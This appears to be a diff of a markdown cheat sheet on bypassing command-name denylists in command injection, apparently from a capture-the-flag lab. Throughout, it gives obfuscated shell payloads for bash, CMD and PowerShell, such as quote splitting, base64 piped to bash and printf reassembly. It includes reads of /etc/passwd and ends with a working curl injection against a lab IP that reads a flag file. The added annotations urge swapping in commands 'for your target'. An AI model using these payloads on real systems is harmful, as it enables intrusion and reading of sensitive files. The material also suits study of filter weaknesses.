@@ -4,7 +4,7 @@
 
 ## Why Command Words Get Blocked
 
-Filters often block dangerous command **names** (`whoami`, `cat`, `nc`, `wget`, etc.) on top of operator/character blocks. The check is usually a string-contains match on the user input:
+Filters often block dangerous command **names** like `whoami`, `cat`, `nc`, and `wget` on top of operator and character blocks. The check is usually a string-contains match on the user input.
 
 ```php
 $blacklist = ['whoami', 'cat', 'ls', 'nc', 'wget', 'curl'];
@@ -14,8 +14,9 @@ foreach ($blacklist as $cmd) {
     }
 }
 ```
+> This PHP denylist checks if the input contains any blocked word. It rejects the whole request if any word matches. The bypass is to write the command so that bash understands it but the string comparison does not recognize it.
 
-Bypass: write the command in a way that bash/PowerShell still understands but the filter string-match doesn't see.
+Bypass: write the command in a way that bash or PowerShell still understands, but the filter's string match does not see it.
 
 ---
 
@@ -29,6 +30,7 @@ w"h"o"am"i           →  whoami     # double quotes
 'w'hoa'm'i           →  whoami     # quotes anywhere
 "who"am"i"           →  whoami     # quotes anywhere
 ```
+> Bash strips empty quote pairs during parsing. The filter sees `w'h'o'am'i` and does not match `whoami`. Bash runs it as `whoami`. Quotes can appear anywhere in a word as long as they are balanced (even number of each type).
 
 **Rules:**
 - Don't mix quote types in the same word (`w'h"o'am"i` breaks)
@@ -40,6 +42,7 @@ w"h"o"am"i           →  whoami     # double quotes
 w\ho\am\i            →  whoami
 \w\h\o\a\m\i         →  whoami
 ```
+> Inserts backslash escapes of regular chars so the denylist string match fails but bash still runs `whoami`; swap in your blocked command name.
 Bash silently removes backslash escapes of regular chars. No quote-balance restriction.
 
 ### Positional parameter `$@`
@@ -47,17 +50,20 @@ Bash silently removes backslash escapes of regular chars. No quote-balance restr
 who$@ami             →  whoami
 w$@ho$@ami           →  whoami
 ```
+> Splits a blocked command word with the empty `$@` positional-args expansion; swap in your blocked command name.
 `$@` is the array of positional args; in a non-script context it's empty → silently removed.
 
 ### `$1`, `$2`, etc. (unset positional args)
 ```bash
 who$1ami             →  whoami      # $1 is unset in interactive shell
 ```
+> Splits a blocked word with the unset `$1` positional parameter (expands to nothing); swap in your blocked command name.
 
 ### Variable concatenation
 ```bash
 a=who; b=ami; $a$b   →  whoami
 ```
+> Splits a blocked command across two variables then concatenates them at runtime; change the fragments and final command for your target.
 Define empty vars or split words across them.
 
 ---
@@ -69,6 +75,7 @@ Define empty vars or split words across them.
 who^ami              →  whoami
 w^h^o^am^i           →  whoami
 ```
+> Inserts CMD's caret escape char inside a blocked command word so the filter misses it but CMD still runs it; swap in your blocked command.
 Caret is the CMD escape character — removed before execution.
 
 ### PowerShell tick (`` ` ``)
@@ -76,17 +83,20 @@ Caret is the CMD escape character — removed before execution.
 who`ami              →  whoami
 w`ho`am`i            →  whoami
 ```
+> Inserts PowerShell's backtick escape mid-word so the denylist misses it but PowerShell still runs it; swap in your blocked command.
 Backtick is PS line-continuation; works mid-word.
 
 ### Variable indirection (PowerShell)
 ```powershell
 $a = 'who'; $b = 'ami'; iex ($a + $b)
 ```
+> Splits a blocked command across PowerShell variables then runs the joined string with `iex`; change the fragments for your target command.
 
 ### Cmd variable substitution
 ```cmd
 set a=who & set b=ami & call %a%%b%
 ```
+> Splits a blocked command across CMD variables then invokes the concatenation with `call`; change the fragments for your target command.
 
 ---
 
@@ -104,6 +114,7 @@ When everything is blocked, layer techniques:
 # c"a"t /etc/passwd
 # = cat /etc/passwd
 ```
+> Stacks newline operator, quote-obfuscated `cat`, `${IFS}` for space and `${PATH:0:1}` for `/`; swap the command, path, and parameter for your target.
 
 Three bypasses stacked:
 1. Newline as operator (Section 5)
@@ -118,6 +129,7 @@ Three bypasses stacked:
 ```bash
 echo "imaohw" | rev | bash    → whoami
 ```
+> Reverses a backwards-written command with `rev` and pipes it to `bash`; reverse your own blocked command and substitute the string.
 If `whoami` is blocked but `rev` isn't.
 
 ### Wildcards
@@ -125,6 +137,7 @@ If `whoami` is blocked but `rev` isn't.
 /usr/bin/who*                  → /usr/bin/whoami (and others)
 /???/???/who??i                → /usr/bin/whoami
 ```
+> Uses shell wildcards to match a binary's path without typing its blocked name; adjust the glob to match your target binary.
 Useful when the absolute path is needed but specific filenames are filtered.
 
 ### Brace expansion (command name not just args)
@@ -132,12 +145,14 @@ Useful when the absolute path is needed but specific filenames are filtered.
 {cat,/etc/passwd}              → cat /etc/passwd
 {w,h,o,a,m,i}                  → w h o a m i (NOT useful — separates into 6 commands)
 ```
+> Uses brace expansion to insert spaces between command and args without a literal space; swap the command and file path for your target.
 
 ### Base64 the whole command
 ```bash
 echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
 # Y2F0... = "cat /etc/passwd" in base64
 ```
+> Base64-decodes the whole command and pipes it to `bash` so no blocked word/char appears in the input; replace the base64 with your encoded command.
 Filter would need to recognize base64 → decode → check decoded string to catch this.
 
 ### Concatenation via printf
@@ -145,17 +160,20 @@ Filter would need to recognize base64 → decode → check decoded string to cat
 $(printf "%s%s%s%s%s%s" w h o a m i)
 $(printf '\167\150\157\141\155\151')          # octal-encoded "whoami"
 ```
+> Reassembles a blocked command from single chars / octal escapes via `printf` in a subshell; change the chars or escapes to spell your command.
 
 ### `bash` invoked indirectly
 ```bash
 $0 -c whoami                   # $0 is the current shell name
 ${SHELL} -c "id"
 ```
+> Invokes a new shell indirectly via `$0`/`${SHELL}` when `bash`/`sh` literals are blocked; swap the `-c` command for your target.
 
 ### Tab-completion abuse (very rare)
 ```bash
 who\ami                         # literal backslash escape
 ```
+> Uses a single backslash escape inside a blocked word so the filter misses it; swap in your blocked command name.
 
 ---
 
@@ -172,6 +190,7 @@ curl -sk -X POST "http://154.57.164.73:30363/" \
   --data-urlencode 'ip=127.0.0.1
 c"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt'
 ```
+> Stacks four bypass techniques in one payload: newline as the operator, quote obfuscation for `cat`, `${IFS}` for the space, and `${PATH:0:1}` for each `/` in the path. Each technique is needed because the filter blocks its corresponding character or word.
 
 Decoded payload:
 ```
@@ -198,6 +217,7 @@ c\at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 # Positional param:
 c$@at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 ```
+> Equivalent payloads obfuscating `cat` via single quotes, backslash, or `$@`; swap the file path and obfuscation style for your target.
 
 ---
 
